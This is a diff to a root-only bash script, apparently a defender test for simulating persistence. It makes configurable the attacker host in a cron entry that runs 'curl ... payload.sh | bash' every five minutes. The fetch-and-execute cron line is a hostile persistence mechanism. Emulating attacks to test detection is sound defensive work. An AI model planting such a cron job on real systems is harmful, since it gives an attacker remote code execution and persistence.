@@ -4,8 +4,10 @@
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
+ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
+ATTACKER_PORT="${ATTACKER_PORT:-80}"
 TAG="DEFENDER-TEST-cron"
-ENTRY="*/5 * * * * curl -s http://10.0.0.1/payload.sh | bash  # $TAG"
+ENTRY="*/5 * * * * curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash  # $TAG"
 
 case "${1:-}" in
   deploy)
